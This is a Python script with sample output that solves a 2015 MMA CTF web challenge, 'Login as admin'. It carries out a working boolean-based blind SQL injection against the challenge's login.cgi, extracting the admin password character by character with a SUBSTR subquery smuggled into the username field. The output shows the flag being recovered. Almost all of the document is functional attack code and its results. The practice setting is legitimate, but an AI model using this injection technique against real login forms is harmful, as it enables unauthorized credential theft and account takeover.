# ---------------------------------------------------------------------------------------
# MMA 1st CTF 2015 - Login as admin (Web 30)
# ---------------------------------------------------------------------------------------
import string
import requests

# set packet data
host        = 'arrive.chal.mmactf.link'
useragent   = 'ispo rulz'
connection  = 'keep-alive'
contenttype = 'application/x-www-form-urlencoded'

# ---------------------------------------------------------------------------------------
if __name__ == '__main__':

	# stupid serial search    
	pw     = '';									# store the password here
	for i in range(1,128):							# for each character				
		for ch in 'AMM{}_abcdef0123456789ghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
			query = "SUBSTR((SELECT password FROM user WHERE user='admin'), "+str(i)+",1)='"+ch+"'"
	
			r = requests.post(
				'http://arrive.chal.mmactf.link/login.cgi',
				data="username=0' or "+query+" or '0&password=foo"
			)

			print 'Trying...', ch

			if r.text.find('You are test user') != -1:
				print '** Character Found:', ch, '**'
				break

		pw = pw + ch

		print 'Character Found: ', ch, '\tSo far: ', pw

		if ch == '}': break							# stop if you encounter closing bracket

	print 'Program finished... Password is: ', pw
# ---------------------------------------------------------------------------------------
'''
root@vasilikoula:~/ctf/mmactf# python web30_bsqli.py 
	Trying... A
	Trying... M
	** Character Found: M **
	Character Found:  M 	So far:  M
	Trying... A
	Trying... M
	** Character Found: M **
	Character Found:  M 	So far:  MM
	Trying... A
	** Character Found: A **
	Character Found:  A 	So far:  MMA
	Trying... A
	Trying... M
	Trying... M
	Trying... {
	** Character Found: { **
	Character Found:  { 	So far:  MMA{
	Trying... A

	[..... TRUNCATED FOR BREVITY .....]

	Trying... c
	Trying... d
	** Character Found: d **
	Character Found:  d 	So far:  MMA{cats_alice_band
	Trying... A
	Trying... M
	Trying... M
	Trying... {
	Trying... }
	** Character Found: } **
	Character Found:  } 	So far:  MMA{cats_alice_band}
'''